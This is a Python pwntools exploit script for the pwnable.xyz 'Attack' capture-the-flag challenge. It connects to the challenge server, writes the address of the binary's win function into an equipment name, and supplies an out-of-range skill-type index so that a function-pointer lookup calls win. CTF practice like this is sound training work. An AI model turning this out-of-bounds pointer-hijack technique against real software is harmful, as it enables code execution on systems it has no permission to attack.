from pwn import *

# Pwnable.xyz Attack challenge
# 100 points

context(kernel="amd64", arch="amd64")

def main():
	e = ELF("challenge")
	win_addr = e.symbols["win"]
	skill_table = e.symbols["SkillTable"]
	teams_arr = e.symbols["Teams"]
	# Teams[0] - > Player[0](0x8) -> Equip (0xd0) -> Name (0x0)
	# Player -> Skills[0] ()

	if 0:
		p = process("./challenge")
		# gdb.attach(p)
	elif 0:
		p = process(["strace", "-o", "strace.out", "./challenge"])
	else:
		p = remote("svc.pwnable.xyz", 30020)

	while True:
		data = p.recvuntil(b":")
		# print(data.decode())
		if b"Which skill do you want to use" in data:
			# Use skill
			p.sendline(b"1")
		elif b"Which target you want to use that skill on" in data:
			# Choose target
			p.sendline(b"0")
		elif b"Do you want to change your equip (y/n)?" in data:
			# Change skill
			p.sendline(b"y")
			print("[ ] Change name of equip")
			p.sendlineafter(b"Name for your equip: ", pack(win_addr))
		elif b"Do you want to change the type of your skills (y/n)? :" in data:
			p.sendline(b"y")
			p.sendlineafter(b"Which skill do you want to change (3 to exit):", b"1") # Should point to func_ptr
			table_offset = teams_arr + 0xd8 - skill_table
			print("[+] Table offset: %d" % table_offset)
			p.sendlineafter(b"What type of skill is this (0: Heal, 1: Attack):", str(table_offset//8).encode("utf-8")) # Should point to pointer to win (skill_table+table_offset = teams->player->equip.name)
			print("[+] Sended skill")
			p.sendlineafter(b"Which skill do you want to change (3 to exit):", b"3") # Should point to func_ptr
			p.interactive()
		elif b"Round (CPU)" in data:
			pass
		else:
			pass
			print("[-] Skipped data")
			print(data.decode())
			print("[-] End of skipped")
main()